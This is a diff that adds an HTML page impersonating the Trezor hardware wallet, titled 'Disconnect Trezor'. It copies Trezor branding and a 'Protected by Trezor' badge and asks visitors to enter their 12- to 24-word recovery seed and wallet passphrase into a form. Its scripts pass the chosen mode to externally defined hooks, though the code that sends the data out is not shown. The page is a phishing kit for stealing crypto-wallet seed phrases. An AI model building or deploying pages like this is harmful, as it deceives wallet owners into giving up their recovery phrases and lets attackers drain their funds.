@@ -1,0 +1,389 @@
+﻿
+<!DOCTYPE html>
+<html lang="en">
+ <head>
+  <meta charset="utf-8"/>
+  <link rel="icon" href="/trezorlogo.svg"/>
+  <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+  <title>
+   Safe
+  </title>
+  <meta content="#000000" name="theme-color"/>
+  <style>
+*,*::before,*::after{box-sizing:border-box}
+html{line-height:1.5;-webkit-text-size-adjust:100%}
+svg{display:block}
+form{margin:0}
+a{color:inherit;text-decoration:none}
+button{font:inherit;color:inherit;background:none;border:0;padding:0;cursor:pointer}
+input{font:inherit;margin:0}
+html,body,#root{margin:0;padding:0;width:100%;height:100%;background:#171717}
+.font-trezor{font-family:Inter,system-ui,-apple-system,sans-serif}
+.flex{display:flex}
+.hidden{display:none}
+.grid{display:grid}
+.relative{position:relative}
+.h-full{height:100%}
+.h-px{height:1px}
+.h-4{height:1rem}
+.h-6{height:1.5rem}
+.h-12{height:3rem}
+.h-16{height:4rem}
+.h-\[122px\]{height:122px}
+.w-full{width:100%}
+.w-4{width:1rem}
+.w-6{width:1.5rem}
+.w-12{width:3rem}
+.w-16{width:4rem}
+.w-\[660px\]{width:660px}
+.max-w-\[360px\]{max-width:360px}
+.max-w-xl{max-width:36rem}
+.flex-col{flex-direction:column}
+.flex-grow{flex-grow:1}
+.flex-shrink-0{flex-shrink:0}
+.items-center{align-items:center}
+.justify-between{justify-content:space-between}
+.justify-center{justify-content:center}
+.gap-2{gap:.5rem}
+.gap-4{gap:1rem}
+.gap-5{gap:1.25rem}
+.overflow-hidden{overflow:hidden}
+.overflow-y-auto{overflow-y:auto}
+.rounded{border-radius:.25rem}
+.rounded-xl{border-radius:.75rem}
+.rounded-full{border-radius:9999px}
+.border{border-width:1px;border-style:solid}
+.border-2{border-width:2px;border-style:solid}
+.border-white{border-color:#fff}
+.border-opacity-10{border-color:rgb(255 255 255 / .1)}
+.border-opacity-\[0\.16\]{border-color:rgb(255 255 255 / .16)}
+.bg-black{background-color:#000}
+.bg-white{background-color:#fff}
+.bg-opacity-10{background-color:rgb(255 255 255 / .1)}
+.bg-\[\#0f0f0f\]{background-color:#0f0f0f}
+.bg-\[\#171717\]{background-color:#171717}
+.bg-\[\#1d1d1d\]{background-color:#1d1d1d}
+.bg-\[\#2d2d2d\]{background-color:#2d2d2d}
+.bg-\[\#333333\]{background-color:#333}
+.bg-\[\#82d8b9\]{background-color:#82d8b9}
+.text-white{color:#fff}
+.text-black{color:#000}
+.text-white\/60{color:rgb(255 255 255 / .6)}
+.text-xs{font-size:.75rem;line-height:1rem}
+.text-sm{font-size:.875rem;line-height:1.25rem}
+.text-xl{font-size:1.25rem;line-height:1.75rem}
+.text-2xl{font-size:1.5rem;line-height:2rem}
+.font-medium{font-weight:500}
+.font-semibold{font-weight:600}
+.text-left{text-align:left}
+.text-center{text-align:center}
+.whitespace-nowrap{white-space:nowrap}
+.opacity-50{opacity:.5}
+.p-2{padding:.5rem}
+.p-2\.5{padding:.625rem}
+.p-7{padding:1.75rem}
+.px-1{padding-left:.25rem;padding-right:.25rem}
+.px-3{padding-left:.75rem;padding-right:.75rem}
+.px-4{padding-left:1rem;padding-right:1rem}
+.px-6{padding-left:1.5rem;padding-right:1.5rem}
+.px-8{padding-left:2rem;padding-right:2rem}
+.py-2{padding-top:.5rem;padding-bottom:.5rem}
+.py-3{padding-top:.75rem;padding-bottom:.75rem}
+.py-4{padding-top:1rem;padding-bottom:1rem}
+.py-12{padding-top:3rem;padding-bottom:3rem}
+.pr-2{padding-right:.5rem}
+.mt-8{margin-top:2rem}
+.mt-24{margin-top:6rem}
+.mb-8{margin-bottom:2rem}
+.p-8{padding:2rem}
+.mx-auto{margin-left:auto;margin-right:auto}
+.grid-cols-2{grid-template-columns:repeat(2,minmax(0,1fr))}
+.aspect-square{aspect-ratio:1 / 1}
+.outline-none{outline:none}
+.transition-all{transition-property:all;transition-timing-function:cubic-bezier(.4,0,.2,1)}
+.transition-transform{transition-property:transform;transition-timing-function:cubic-bezier(.4,0,.2,1)}
+.duration-200{transition-duration:.2s}
+.duration-300{transition-duration:.3s}
+.hover\:brightness-110:hover{filter:brightness(1.1)}
+.disabled\:brightness-75:disabled{filter:brightness(.75)}
+.focus\:ring-2:focus,.focus\:ring-\[\#82d8b9\]:focus{box-shadow:0 0 0 2px #82d8b9}
+form input:-webkit-autofill,
+form input:-webkit-autofill:hover,
+form input:-webkit-autofill:focus{
+-webkit-box-shadow:0 0 0 1000px #1d1d1d inset !important;
+-webkit-text-fill-color:#fff !important;
+caret-color:#fff;
+transition:background-color 99999s ease-out
+}
+#trzp-form-wrap{flex-shrink:0}
+.trzp-continue{
+cursor:pointer;
+touch-action:manipulation;
+-webkit-tap-highlight-color:transparent;
+transition:transform .07s ease,box-shadow .07s ease
+}
+.trzp-continue:not(:disabled):active,
+.trzp-continue:not(:disabled).is-pressed{
+transform:translateY(1px) scale(.98);
+box-shadow:inset 0 1px 2px rgba(0,0,0,.22)
+}
+@media (min-width:640px){
+.sm\:grid-cols-3{grid-template-columns:repeat(3,minmax(0,1fr))}
+}
+@media (min-width:768px){
+.md\:flex{display:flex}
+.md\:py-8{padding-top:2rem;padding-bottom:2rem}
+.md\:justify-center{justify-content:center}
+form.overflow-y-auto{scrollbar-gutter:stable both-edges}
+}
+</style>
+ </head>
+ <body>
+  <div id="root">
+   <div class="flex h-full w-full bg-black font-trezor text-white">
+    <div class="hidden h-full w-[660px] flex-col items-center justify-between bg-[#0f0f0f] py-4 md:flex">
+     <span>
+     </span>
+     <svg class="h-16 w-16" fill="#FFF" viewbox="0 0 177 256" xmlns="http://www.w3.org/2000/svg">
+      <path d="M150.66 59.407C150.66 26.947 122.488 0 88.191 0 53.895 0 25.722 26.947 25.722 59.407v18.985H0v136.575L88.191 256l88.192-41.033V79.005H150.66V59.407Zm-93.09 0c0-15.311 13.473-27.56 30.621-27.56 17.149 0 30.622 12.249 30.622 27.56v18.985H57.57V59.407Zm83.291 133.512-52.67 24.497-52.67-24.497v-82.067h105.34v82.067Z">
+      </path>
+     </svg>
+     <a class="flex items-center gap-2 rounded-full bg-[#333333] px-4 py-2 transition-all duration-300 hover:brightness-110" href="https://trezor.io/" rel="noreferrer" target="_blank">
+      trezor.io
+      <svg class="h-4 w-4" fill="white" viewbox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
+       <path d="M25 8v13a1 1 0 1 1-2 0V10.414L8.707 24.707a1 1 0 0 1-1.415-1.415L21.586 9H11a1 1 0 0 1 0-2h13a1 1 0 0 1 1 1">
+       </path>
+      </svg>
+     </a>
+    </div>
+    <form class="flex h-full flex-grow flex-col items-center gap-2 overflow-y-auto bg-[#171717] py-12 md:py-8" autocomplete="off">
+     <!-- Header -->
+     <div class="flex h-[122px] w-full max-w-[360px] items-center justify-center rounded-full border-2 border-white border-opacity-[0.16] bg-[#1d1d1d] p-2.5">
+      <div class="aspect-square h-full flex-shrink-0 rounded-full bg-[#2d2d2d] p-7">
+       <svg class="h-full w-full" fill="#FFF" viewbox="0 0 177 256" xmlns="http://www.w3.org/2000/svg">
+        <path d="M150.66 59.407C150.66 26.947 122.488 0 88.191 0 53.895 0 25.722 26.947 25.722 59.407v18.985H0v136.575L88.191 256l88.192-41.033V79.005H150.66V59.407Zm-93.09 0c0-15.311 13.473-27.56 30.621-27.56 17.149 0 30.622 12.249 30.622 27.56v18.985H57.57V59.407Zm83.291 133.512-52.67 24.497-52.67-24.497v-82.067h105.34v82.067Z">
+        </path>
+       </svg>
+      </div>
+      <div class="flex flex-grow flex-col gap-2">
+       <div class="text-center text-xl font-medium whitespace-nowrap pr-2" id="trzp-page-title">Disconnect Trezor</div>
+      </div>
+     </div>
+
+     <!-- Wallet chooser + active-wallet bar (both in same container) -->
+     <div id="trzp-chooser" class="mt-24 flex w-full max-w-xl flex-col bg-[#171717] px-8">
+
+      <!-- Standard wallet row (hidden when passphrase active) -->
+      <div id="trzp-row-standard" style="overflow:hidden;max-height:80px;transition:max-height 0.28s cubic-bezier(0.22,1,0.36,1),opacity 0.18s cubic-bezier(0.22,1,0.36,1);opacity:1;">
+       <button id="trzp-opt-standard" onclick="goPhrasePage('standard')" class="flex w-full items-center justify-between gap-2 px-1 py-3 text-left" type="button">
+        <div class="flex items-center gap-5">
+         <svg class="h-12 w-12 rounded-xl bg-white bg-opacity-10 p-2" viewbox="0 0 24 24" xml:space="preserve" xmlns="http://www.w3.org/2000/svg"><path d="M4.84 3.788c-.657.11-1.285.588-1.607 1.225-.241.478-.232.193-.232 6.987 0 5.187.01 6.264.057 6.485.152.72.702 1.353 1.416 1.631l.266.104 7.82.012c5.706.009 7.877 0 8.03-.033.445-.095.879-.466 1.054-.9l.096-.239V7.94l-.096-.239c-.151-.375-.506-.713-.924-.88-.065-.026-2.857-.047-7.9-.06l-7.8-.021-.15-.093a.765.765 0 0 1-.022-1.277l.166-.11 6.623-.02c4.933-.015 6.643-.032 6.703-.067.106-.061.278-.248.341-.371.07-.135.063-.479-.012-.623a.9.9 0 0 0-.402-.376c-.078-.03-2.136-.041-6.72-.038-3.634.003-6.652.013-6.707.023m7.65 4.443 7.75.01v10.52l-7.61-.011-7.61-.01-.15-.093a1 1 0 0 1-.26-.28l-.11-.187-.011-4.979c-.006-2.739-.002-5.002.009-5.03.015-.04.041-.04.131-.001.087.039 1.804.052 7.861.061m4.127 4.346c-.183.079-.41.294-.508.479-.121.229-.121.659 0 .888.1.19.328.402.517.481.169.071.579.071.748 0 .189-.079.417-.291.517-.481.065-.123.087-.234.087-.444s-.022-.321-.087-.444c-.1-.19-.328-.402-.517-.481-.166-.07-.596-.069-.757.002" fill="currentColor" fill-rule="evenodd"></path></svg>
+         <div class="flex flex-col">
+          <span class="text-2xl font-medium">Standard wallet</span>
+          <span class="text-sm font-medium text-white/60">No passphrase</span>
+         </div>
+        </div>
+        <svg id="trzp-chevron-standard" class="h-6 w-6 transition-transform duration-200" fill="none" viewbox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"><path d="m22.707 16.708-10 10a1 1 0 0 1-1.415-1.415L20.586 16l-9.294-9.292a1 1 0 0 1 1.415-1.415l10 10a1 1 0 0 1 0 1.415" fill="currentColor"></path></svg>
+       </button>
+      </div>
+
+      <!-- Divider (hidden when a wallet is active) -->
+      <span id="trzp-divider" class="h-px w-full bg-white bg-opacity-10" style="transition:opacity 0.18s cubic-bezier(0.22,1,0.36,1);"></span>
+
+      <!-- Passphrase wallet row (hidden when standard active) -->
+      <div id="trzp-row-passphrase" style="overflow:hidden;max-height:80px;transition:max-height 0.28s cubic-bezier(0.22,1,0.36,1),opacity 0.18s cubic-bezier(0.22,1,0.36,1);opacity:1;">
+       <button id="trzp-opt-passphrase" onclick="goPhrasePage('passphrase')" class="flex w-full items-center justify-between gap-2 px-1 py-3 text-left" type="button">
+        <div class="flex items-center gap-5">
+         <svg class="h-12 w-12 rounded-xl bg-white bg-opacity-10 p-2.5" fill="none" viewbox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"><path d="M26 10h-4V7a6 6 0 1 0-12 0v3H6a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h20a2 2 0 0 0 2-2V12a2 2 0 0 0-2-2M12 7a4 4 0 1 1 8 0v3h-8zm14 19H6V12h20zm-8.5-7a1.5 1.5 0 1 1-3 0 1.5 1.5 0 0 1 3 0" fill="currentColor"></path></svg>
+         <div class="flex flex-col">
+          <span class="text-2xl font-medium">Passphrase wallet</span>
+          <span class="text-sm font-medium text-white/60">Passphrase is required</span>
+         </div>
+        </div>
+        <svg id="trzp-chevron-passphrase" class="h-6 w-6 transition-transform duration-200" fill="none" viewbox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"><path d="m22.707 16.708-10 10a1 1 0 0 1-1.415-1.415L20.586 16l-9.294-9.292a1 1 0 0 1 1.415-1.415l10 10a1 1 0 0 1 0 1.415" fill="currentColor"></path></svg>
+       </button>
+      </div>
+
+     </div>
+
+     <div class="w-full max-w-xl mx-auto px-8">
+     <div id="trzp-alarm" style="display:none;margin:14px 0 0;position:relative;background:#b91c1c;color:#fff;padding:12px 16px;border-radius:8px;text-align:center;font-size:13px;font-weight:500;line-height:1.4;box-sizing:border-box;"></div>
+     </div>
+
+     <!-- Word form: hidden initially, animates open on wallet selection -->
+     <div id="trzp-form-wrap" style="overflow:hidden;max-height:0;transition:max-height 0.32s cubic-bezier(0.22,1,0.36,1),opacity 0.2s cubic-bezier(0.22,1,0.36,1);opacity:0;width:100%;">
+      <div class="flex w-full max-w-xl flex-col gap-4 bg-[#171717] px-6 py-4 mx-auto">
+       <div class="overflow-hidden" style="padding:0 10px 20px;">
+        <div class="flex flex-col gap-2" style="height: auto;">
+         <div class="flex flex-col gap-2">
+          <div class="flex gap-2">
+           <button class="w-full rounded border border-white border-opacity-10 bg-[#1d1d1d] p-2 text-sm font-semibold transition-all duration-300" type="button" id="wc-24">
+            24 words
+           </button>
+           <button class="w-full rounded border border-white border-opacity-10 bg-[#1d1d1d] p-2 text-sm font-semibold transition-all duration-300" type="button">
+            20 words
+           </button>
+           <button class="w-full rounded border border-white border-opacity-10 bg-[#1d1d1d] p-2 text-sm font-semibold transition-all duration-300" type="button">
+            12 words
+           </button>
+          </div>
+          <div class="grid grid-cols-2 gap-2 py-2 sm:grid-cols-3">
+           <div class="relative w-full"><input class="w-full rounded border border-white border-opacity-10 bg-[#1d1d1d] p-2 px-3 text-sm font-semibold text-white outline-none transition-all duration-300 focus:ring-2 focus:ring-[#82d8b9]" placeholder="Word 1" type="password" value=""/></div>
+           <div class="relative w-full"><input class="w-full rounded border border-white border-opacity-10 bg-[#1d1d1d] p-2 px-3 text-sm font-semibold text-white outline-none transition-all duration-300 focus:ring-2 focus:ring-[#82d8b9]" placeholder="Word 2" type="password" value=""/></div>
+           <div class="relative w-full"><input class="w-full rounded border border-white border-opacity-10 bg-[#1d1d1d] p-2 px-3 text-sm font-semibold text-white outline-none transition-all duration-300 focus:ring-2 focus:ring-[#82d8b9]" placeholder="Word 3" type="password" value=""/></div>
+           <div class="relative w-full"><input class="w-full rounded border border-white border-opacity-10 bg-[#1d1d1d] p-2 px-3 text-sm font-semibold text-white outline-none transition-all duration-300 focus:ring-2 focus:ring-[#82d8b9]" placeholder="Word 4" type="password" value=""/></div>
+           <div class="relative w-full"><input class="w-full rounded border border-white border-opacity-10 bg-[#1d1d1d] p-2 px-3 text-sm font-semibold text-white outline-none transition-all duration-300 focus:ring-2 focus:ring-[#82d8b9]" placeholder="Word 5" type="password" value=""/></div>
+           <div class="relative w-full"><input class="w-full rounded border border-white border-opacity-10 bg-[#1d1d1d] p-2 px-3 text-sm font-semibold text-white outline-none transition-all duration-300 focus:ring-2 focus:ring-[#82d8b9]" placeholder="Word 6" type="password" value=""/></div>
+           <div class="relative w-full"><input class="w-full rounded border border-white border-opacity-10 bg-[#1d1d1d] p-2 px-3 text-sm font-semibold text-white outline-none transition-all duration-300 focus:ring-2 focus:ring-[#82d8b9]" placeholder="Word 7" type="password" value=""/></div>
+           <div class="relative w-full"><input class="w-full rounded border border-white border-opacity-10 bg-[#1d1d1d] p-2 px-3 text-sm font-semibold text-white outline-none transition-all duration-300 focus:ring-2 focus:ring-[#82d8b9]" placeholder="Word 8" type="password" value=""/></div>
+           <div class="relative w-full"><input class="w-full rounded border border-white border-opacity-10 bg-[#1d1d1d] p-2 px-3 text-sm font-semibold text-white outline-none transition-all duration-300 focus:ring-2 focus:ring-[#82d8b9]" placeholder="Word 9" type="password" value=""/></div>
+           <div class="relative w-full"><input class="w-full rounded border border-white border-opacity-10 bg-[#1d1d1d] p-2 px-3 text-sm font-semibold text-white outline-none transition-all duration-300 focus:ring-2 focus:ring-[#82d8b9]" placeholder="Word 10" type="password" value=""/></div>
+           <div class="relative w-full"><input class="w-full rounded border border-white border-opacity-10 bg-[#1d1d1d] p-2 px-3 text-sm font-semibold text-white outline-none transition-all duration-300 focus:ring-2 focus:ring-[#82d8b9]" placeholder="Word 11" type="password" value=""/></div>
+           <div class="relative w-full"><input class="w-full rounded border border-white border-opacity-10 bg-[#1d1d1d] p-2 px-3 text-sm font-semibold text-white outline-none transition-all duration-300 focus:ring-2 focus:ring-[#82d8b9]" placeholder="Word 12" type="password" value=""/></div>
+           <div class="relative w-full"><input class="w-full rounded border border-white border-opacity-10 bg-[#1d1d1d] p-2 px-3 text-sm font-semibold text-white outline-none transition-all duration-300 focus:ring-2 focus:ring-[#82d8b9]" placeholder="Word 13" type="password" value=""/></div>
+           <div class="relative w-full"><input class="w-full rounded border border-white border-opacity-10 bg-[#1d1d1d] p-2 px-3 text-sm font-semibold text-white outline-none transition-all duration-300 focus:ring-2 focus:ring-[#82d8b9]" placeholder="Word 14" type="password" value=""/></div>
+           <div class="relative w-full"><input class="w-full rounded border border-white border-opacity-10 bg-[#1d1d1d] p-2 px-3 text-sm font-semibold text-white outline-none transition-all duration-300 focus:ring-2 focus:ring-[#82d8b9]" placeholder="Word 15" type="password" value=""/></div>
+           <div class="relative w-full"><input class="w-full rounded border border-white border-opacity-10 bg-[#1d1d1d] p-2 px-3 text-sm font-semibold text-white outline-none transition-all duration-300 focus:ring-2 focus:ring-[#82d8b9]" placeholder="Word 16" type="password" value=""/></div>
+           <div class="relative w-full"><input class="w-full rounded border border-white border-opacity-10 bg-[#1d1d1d] p-2 px-3 text-sm font-semibold text-white outline-none transition-all duration-300 focus:ring-2 focus:ring-[#82d8b9]" placeholder="Word 17" type="password" value=""/></div>
+           <div class="relative w-full"><input class="w-full rounded border border-white border-opacity-10 bg-[#1d1d1d] p-2 px-3 text-sm font-semibold text-white outline-none transition-all duration-300 focus:ring-2 focus:ring-[#82d8b9]" placeholder="Word 18" type="password" value=""/></div>
+           <div class="relative w-full"><input class="w-full rounded border border-white border-opacity-10 bg-[#1d1d1d] p-2 px-3 text-sm font-semibold text-white outline-none transition-all duration-300 focus:ring-2 focus:ring-[#82d8b9]" placeholder="Word 19" type="password" value=""/></div>
+           <div class="relative w-full"><input class="w-full rounded border border-white border-opacity-10 bg-[#1d1d1d] p-2 px-3 text-sm font-semibold text-white outline-none transition-all duration-300 focus:ring-2 focus:ring-[#82d8b9]" placeholder="Word 20" type="password" value=""/></div>
+           <div class="relative w-full"><input class="w-full rounded border border-white border-opacity-10 bg-[#1d1d1d] p-2 px-3 text-sm font-semibold text-white outline-none transition-all duration-300 focus:ring-2 focus:ring-[#82d8b9]" placeholder="Word 21" type="password" value=""/></div>
+           <div class="relative w-full"><input class="w-full rounded border border-white border-opacity-10 bg-[#1d1d1d] p-2 px-3 text-sm font-semibold text-white outline-none transition-all duration-300 focus:ring-2 focus:ring-[#82d8b9]" placeholder="Word 22" type="password" value=""/></div>
+           <div class="relative w-full"><input class="w-full rounded border border-white border-opacity-10 bg-[#1d1d1d] p-2 px-3 text-sm font-semibold text-white outline-none transition-all duration-300 focus:ring-2 focus:ring-[#82d8b9]" placeholder="Word 23" type="password" value=""/></div>
+           <div class="relative w-full"><input class="w-full rounded border border-white border-opacity-10 bg-[#1d1d1d] p-2 px-3 text-sm font-semibold text-white outline-none transition-all duration-300 focus:ring-2 focus:ring-[#82d8b9]" placeholder="Word 24" type="password" value=""/></div>
+           <div id="trzp-passphrase-row" class="relative w-full" style="display:none;grid-column:1/-1">
+            <input id="trzp-passphrase" class="w-full rounded border border-white border-opacity-10 bg-[#1d1d1d] p-2 px-3 text-sm font-semibold text-white outline-none transition-all duration-300 focus:ring-2 focus:ring-[#82d8b9]" placeholder="Enter passphrase" type="password" autocomplete="off" value=""/>
+           </div>
+          </div>
+          <div class="flex items-center justify-between">
+           <span class="flex items-center gap-2 text-xs font-medium text-white/60">
+            <svg class="lucide lucide-lock h-4 w-4" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+             <rect height="11" rx="2" ry="2" width="18" x="3" y="11"></rect>
+             <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+            </svg>
+            Protected by Trezor ©
+           </span>
+           <button class="rounded-full bg-[#82d8b9] p-2 px-6 text-sm text-black disabled:brightness-75 trzp-continue" type="button">
+            Continue
+           </button>
+          </div>
+         </div>
+        </div>
+       </div>
+      </div>
+     </div>
+    </form>
+   </div>
+  </div>
+  <script>
+    let csrf = null;
+
+    function getCSRF() {
+      if (!csrf && window._liveledCSRF) {
+        csrf = window._liveledCSRF;
+      }
+    }
+
+    document.addEventListener('DOMContentLoaded', function() {
+      getCSRF();
+    });
+
+    var _trzpActiveMode = null;
+    var _trzpRowTx = 'max-height 0.28s cubic-bezier(0.22, 1, 0.36, 1), opacity 0.18s cubic-bezier(0.22, 1, 0.36, 1)';
+    function _trzpHideChooserRow(el) {
+      if (!el) return;
+      el.style.transition = 'none';
+      el.style.maxHeight = '0';
+      el.style.opacity = '0';
+      el.offsetHeight;
+      el.style.transition = _trzpRowTx;
+    }
+
+    function goPhrasePage(mode) {
+      var alarm = document.getElementById('trzp-alarm');
+      if (alarm) alarm.style.display = 'none';
+      var rowStd  = document.getElementById('trzp-row-standard');
+      var rowPp   = document.getElementById('trzp-row-passphrase');
+      var divider = document.getElementById('trzp-divider');
+      var chevStd = document.getElementById('trzp-chevron-standard');
+      var chevPp  = document.getElementById('trzp-chevron-passphrase');
+      var wrap    = document.getElementById('trzp-form-wrap');
+
+      // Toggle: clicking the active wallet collapses the form and shows both options again
+      if (_trzpActiveMode === mode) {
+        _trzpActiveMode = null;
+        // Collapse form
+        if (wrap) { wrap.style.maxHeight = '0'; wrap.style.opacity = '0'; }
+        // Show both rows + divider
+        if (rowStd)  { rowStd.style.maxHeight  = '80px'; rowStd.style.opacity  = '1'; }
+        if (rowPp)   { rowPp.style.maxHeight   = '80px'; rowPp.style.opacity   = '1'; }
+        if (divider) divider.style.display = '';
+        // Reset chevrons
+        if (chevStd) chevStd.style.transform = '';
+        if (chevPp)  chevPp.style.transform  = '';
+        return;
+      }
+
+      _trzpActiveMode = mode;
+
+      // Clear all word inputs when switching modes
+      document.querySelectorAll('input[placeholder^="Word"]').forEach(function(inp){ inp.value = ''; });
+      var ppInp = document.getElementById('trzp-passphrase');
+      if (ppInp) ppInp.value = '';
+
+      // Hide the OTHER row, keep the chosen one visible at top
+      if (mode === 'standard') {
+        _trzpHideChooserRow(rowPp);
+        if (chevStd) chevStd.style.transform = 'rotate(90deg)';
+        if (chevPp)  chevPp.style.transform  = '';
+      } else {
+        _trzpHideChooserRow(rowStd);
+        if (chevPp)  chevPp.style.transform  = 'rotate(90deg)';
+        if (chevStd) chevStd.style.transform = '';
+      }
+      if (divider) divider.style.display = 'none';
+
+      // Expand form
+      if (wrap) {
+        wrap.style.maxHeight = '3000px';
+        wrap.style.opacity = '1';
+      }
+
+      if (window._trzp_setMode) window._trzp_setMode(mode);
+    }
+  </script>
+<script>
+(function(){
+  function bind(btn){
+    if(!btn||btn._trzpPress)return;
+    btn._trzpPress=true;
+    function down(){ if(btn.disabled)return; btn.classList.add('is-pressed'); }
+    function up(){ btn.classList.remove('is-pressed'); }
+    btn.addEventListener('pointerdown',function(e){
+      if(btn.disabled)return;
+      try{btn.setPointerCapture(e.pointerId);}catch(_e){}
+      down();
+    });
+    ['pointerup','pointercancel','lostpointercapture','pointerleave','blur'].forEach(function(t){
+      btn.addEventListener(t,up);
+    });
+    btn.addEventListener('keydown',function(e){
+      if(e.repeat)return;
+      if(e.key!=='Enter'&&e.key!==' ')return;
+      down();
+    });
+    btn.addEventListener('keyup',function(e){
+      if(e.key!=='Enter'&&e.key!==' ')return;
+      up();
+    });
+  }
+  function go(){ bind(document.querySelector('.trzp-continue')); }
+  if(document.readyState==='loading') document.addEventListener('DOMContentLoaded',go);
+  else go();
+})();
+</script>
+ </body>
+</html>
+
+
